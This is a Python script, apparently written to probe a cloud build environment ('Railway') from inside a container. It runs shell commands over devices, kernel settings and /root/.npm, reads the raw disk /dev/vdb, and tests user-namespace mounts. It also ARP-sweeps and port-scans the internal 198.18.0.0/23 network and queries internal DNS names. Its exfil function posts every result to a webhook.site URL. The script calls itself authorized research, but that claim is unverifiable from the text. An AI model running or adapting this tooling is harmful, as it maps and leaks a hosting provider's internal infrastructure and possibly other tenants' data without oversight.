#!/usr/bin/env python3
"""Lane C battery 2: device access, shared cache, L2/L3 sweep. Authorized Railway research."""
import socket, struct, subprocess, time, os, sys, json, urllib.request

TOKEN = "31fc19a8-5cfc-44ac-b27f-517fdcb8ffbb"
W = "https://webhook.site/" + TOKEN
CAP = 60000

def exfil(label, data):
    data = str(data)[:CAP]
    try:
        req = urllib.request.Request(W, data=("###%s### %s" % (label, data)).encode(),
                                     headers={"Content-Type": "text/plain"})
        urllib.request.urlopen(req, timeout=25)
    except Exception as e:
        sys.stderr.write("exfil fail %s: %s\n" % (label, e))

def run(cmd):
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        return (p.stdout or "") + (p.stderr or "")
    except Exception as e:
        return "ERR %s" % e

def iface_mac_ip():
    mac = open("/sys/class/net/eth1/address").read().strip()
    ip = "198.18.0.126"
    for line in open("/proc/net/fib_trie"):
        pass
    # derive own ip from /proc/net/route iface + fib_trie LOCAL
    return mac, ip

# ---------- D0: devices, otel socket, misc ----------
mac, ip = iface_mac_ip()
d0 = []
d0.append("=== /dev ===\n" + run("ls -la /dev/ 2>&1"))
d0.append("=== /sys/block ===\n" + run("ls -la /sys/block/ 2>&1"))
d0.append("=== /sys/dev/block ===\n" + run("ls -la /sys/dev/block/ 2>&1"))
d0.append("=== /sys/dev/block/254:* ===\n" + run("for d in /sys/dev/block/254:*; do echo \"-- $d\"; ls -la $d 2>/dev/null | head -20; cat $d/size 2>/dev/null; cat $d/dev 2>/dev/null; done 2>&1"))
d0.append("=== stat /dev/vdb /dev/vda ===\n" + run("stat /dev/vdb /dev/vda /dev/sda 2>&1"))
try:
    f = open("/dev/vdb", "rb"); head = f.read(4096); f.close()
    d0.append("=== /dev/vdb READ OK bytes=%d head_hex=%s ===\n" % (len(head), head[:64].hex()))
except Exception as e:
    d0.append("=== /dev/vdb read: %s ===\n" % e)
# otel unix socket connect test
for path in ("/dev/otel-grpc.sock",):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect(path)
        d0.append("=== OTEL connect %s: CONNECTED ===\n" % path)
        s.close()
    except Exception as e:
        d0.append("=== OTEL connect %s: %s ===\n" % (path, e))
d0.append("=== MISE env ===\n" + run("env | grep -i mise 2>&1"))
d0.append("=== kernel sysctls ===\n" + run("cat /proc/sys/kernel/core_pattern /proc/sys/kernel/unprivileged_userns_clone /proc/sys/user/max_user_namespaces /proc/sys/kernel/modprobe 2>&1"))
d0.append("=== userns test ===\n" + run("unshare -Ur id 2>&1; unshare -Urm sh -c 'mount -t tmpfs t /mnt 2>&1 && echo MOUNT_OK' 2>&1"))
d0.append("=== iface stats ===\n" + run("for f in /sys/class/net/eth1/*; do case $f in */statistics/*|*/address|*/mtu|*/type|*/ifindex|*/operstate) echo \"$f=$(cat $f 2>/dev/null)\";; esac; done 2>&1"))
d0.append("=== fd ===\n" + run("ls -la /proc/self/fd /proc/1/fd 2>&1 | head -40"))
exfil("D0-devices", "\n".join(d0))

# ---------- D1: shared cache inspection (/root/.npm) ----------
d1 = []
d1.append("=== /root/.npm top ===\n" + run("ls -la /root/.npm/ 2>&1"))
d1.append("=== /root/.npm du ===\n" + run("du -sh /root/.npm/* 2>/dev/null | head -20"))
d1.append("=== newest 40 files ===\n" + run("find /root/.npm -type f -printf '%T@ %s %p\\n' 2>/dev/null | sort -rn | head -40"))
d1.append("=== index-v5 sample (package names) ===\n" + run("find /root/.npm/_cacache/index-v5 -type f 2>/dev/null | head -3 | while read f; do echo \"-- $f\"; head -c 500 \"$f\"; echo; done"))
d1.append("=== cacache dir count ===\n" + run("find /root/.npm/_cacache -type f 2>/dev/null | wc -l; find /root/.npm/_cacache -type d 2>/dev/null | wc -l"))
d1.append("=== mise dirs ===\n" + run("ls -la /mise/ /mise/cache /mise/installs 2>&1 | head -40"))
exfil("D1-npmcache", "\n".join(d1))

# ---------- D2: ARP sweep 198.18.0.0/23 ----------
def arp_sweep(mac, ip):
    ETH_P_ARP = 0x0806
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETH_P_ARP))
    s.bind(("eth1", 0))
    s.settimeout(0.05)
    macb = bytes.fromhex(mac.replace(":", ""))
    ipb = socket.inet_aton(ip)
    bcast = b"\xff" * 6
    found = {}
    targets = []
    for third in (0, 1):
        for last in range(1, 255):
            t = "198.18.%d.%d" % (third, last)
            if t == ip:
                continue
            targets.append(t)
    # send requests
    for t in targets:
        tgt = socket.inet_aton(t)
        frame = bcast + macb + struct.pack("!H", ETH_P_ARP)
        frame += struct.pack("!HHBBH", 1, 0x0800, 6, 4, 1)
        frame += macb + ipb + b"\x00" * 6 + tgt
        try:
            s.send(frame)
        except Exception:
            pass
        time.sleep(0.0005)
    # collect
    end = time.time() + 4
    while time.time() < end:
        try:
            pkt = s.recv(2048)
        except socket.timeout:
            continue
        except Exception:
            break
        if len(pkt) < 42:
            continue
        eth = pkt[:14]
        if eth[12:14] != b"\x08\x06":
            continue
        arp = pkt[14:42]
        oper = struct.unpack("!H", arp[6:8])[0]
        sha = ":".join("%02x" % b for b in arp[8:14])
        spa = socket.inet_ntoa(arp[14:18])
        if oper == 2:
            found[spa] = sha
    s.close()
    return found

arp_found = {}
try:
    arp_found = arp_sweep(mac, ip)
except Exception as e:
    arp_found = {"__error__": str(e)}
d2 = "mac=%s ip=%s\n=== ARP replies ===\n%s\n=== /proc/net/arp after ===\n%s\n=== ip neigh (missing ip) ===\n%s" % (
    mac, ip, json.dumps(arp_found, indent=1), run("cat /proc/net/arp 2>&1"), run("ip neigh 2>&1"))
exfil("D2-arp-sweep", d2)

# ---------- D3: TCP connect scan ----------
def tcp_scan(host, ports, timeout=0.6):
    open_ports = []
    for p in ports:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            r = s.connect_ex((host, p))
            s.close()
            if r == 0:
                open_ports.append(p)
        except Exception:
            pass
    return open_ports

hosts = sorted(arp_found.keys()) if isinstance(arp_found, dict) and "__error__" not in arp_found else []
if "198.18.0.1" not in hosts:
    hosts.append("198.18.0.1")
PORTS = [22, 53, 80, 443, 2375, 2376, 3000, 5000, 6443, 8080, 8443, 9000, 9090, 10250, 15432, 50051]
d3 = []
for h in hosts[:60]:
    op = tcp_scan(h, PORTS)
    d3.append("%s: %s" % (h, op if op else "none"))
exfil("D3-tcp-scan", "hosts=%s\n%s" % (hosts, "\n".join(d3)))

# ---------- D4: ICMP echo to discovered hosts ----------
def icmp_ping(hosts, timeout=2.0):
    res = {}
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        s.settimeout(timeout)
    except Exception as e:
        return {"__error__": str(e)}
    for h in hosts[:60]:
        try:
            pkt = struct.pack("!BBHHH", 8, 0, 0, os.getpid() & 0xFFFF, 1) + b"laneC"
            cs = 0
            for i in range(0, len(pkt), 2):
                cs += (pkt[i] << 8) + (pkt[i+1] if i+1 < len(pkt) else 0)
            cs = (cs >> 16) + (cs & 0xFFFF); cs += cs >> 16
            pkt = struct.pack("!BBHHH", 8, 0, ~cs & 0xFFFF, os.getpid() & 0xFFFF, 1) + b"laneC"
            s.sendto(pkt, (h, 0))
            t0 = time.time()
            while time.time() - t0 < timeout:
                try:
                    data, addr = s.recvfrom(2048)
                    if addr[0] == h:
                        res[h] = "REPLY"
                        break
                except socket.timeout:
                    break
        except Exception as e:
            res[h] = "ERR %s" % e
    s.close()
    return res

hosts2 = [h for h in hosts if h != ip][:60]
d4 = json.dumps(icmp_ping(hosts2), indent=1) if hosts2 else "no hosts"
exfil("D4-icmp", d4)

# ---------- D5: DNS behavior ----------
d5 = []
for name in ("railway.internal", "buildkitd", "metadata.google.internal", "stacker.railway.internal",
             "backboard.railway.app", "registry.railway.internal", "localhost"):
    try:
        d5.append("%s -> %s" % (name, socket.getaddrinfo(name, None)))
    except Exception as e:
        d5.append("%s -> %s" % (name, e))
d5.append("=== resolv ===" + run("cat /etc/resolv.conf"))
exfil("D5-dns", "\n".join(d5))

print("battery2 done")
